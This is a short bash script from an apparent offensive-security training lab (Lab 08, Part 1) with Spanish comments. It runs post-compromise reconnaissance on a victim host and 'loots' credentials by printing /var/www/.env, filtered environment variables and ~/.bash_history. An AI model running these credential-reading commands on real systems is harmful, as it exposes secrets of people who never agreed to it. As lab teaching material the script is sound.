#!/usr/bin/env bash
# Reconocimiento inicial y loot de credenciales (Lab 08 - Parte 1: R1 y R2).
# Ejecutar dentro del host comprometido (make shell-victima como operador).
set -euo pipefail

echo "=== 1. Identidad y Sistema (Situational Awareness) ==="
id
whoami
hostname
uname -a
echo

echo "=== 2. Entorno y Red ==="
ip -br a 2>/dev/null || ip a
env | grep -E 'DEPLOY|USER|PATH|SHELL'
echo

echo "=== 3. R1 · Archivos en /opt (Reconocimiento del Host) ==="
ls -la /opt/phantom-deploy
cat /opt/phantom-deploy/DEPLOY_NOTES.txt
echo

echo "=== 4. R2 · Loot de credenciales (.env y bash_history) ==="
cat /var/www/.env
echo
echo "--- ~/.bash_history ---"
cat ~/.bash_history
